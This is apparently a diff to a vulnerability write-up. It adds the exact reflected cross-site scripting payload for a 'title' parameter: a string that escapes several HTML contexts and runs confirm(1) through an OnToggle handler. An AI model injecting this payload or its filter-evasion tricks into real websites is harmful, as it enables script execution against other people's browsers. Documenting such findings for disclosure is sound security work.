@@ -27,7 +27,8 @@ Step 2: Submit `navi'"<>` via the discovered `title` parameter to confirm it is 
 
 <img width="569" height="233" alt="image" src="https://github.com/user-attachments/assets/2598cb73-47e5-47c1-8f10-030150754921" />
 
-Step 3: Submit the payload via the `title` parameter
+Step 3: Submit the payload via the `title` parameter: '"1<!--></Title/</Textarea/</Script/></Iframe><Details/Open/OnToggle%3D(confirm)(1)-->
+
 
 <img width="959" height="275" alt="image" src="https://github.com/user-attachments/assets/e10445f9-10a0-4e84-a789-1ada21f71d24" />
 
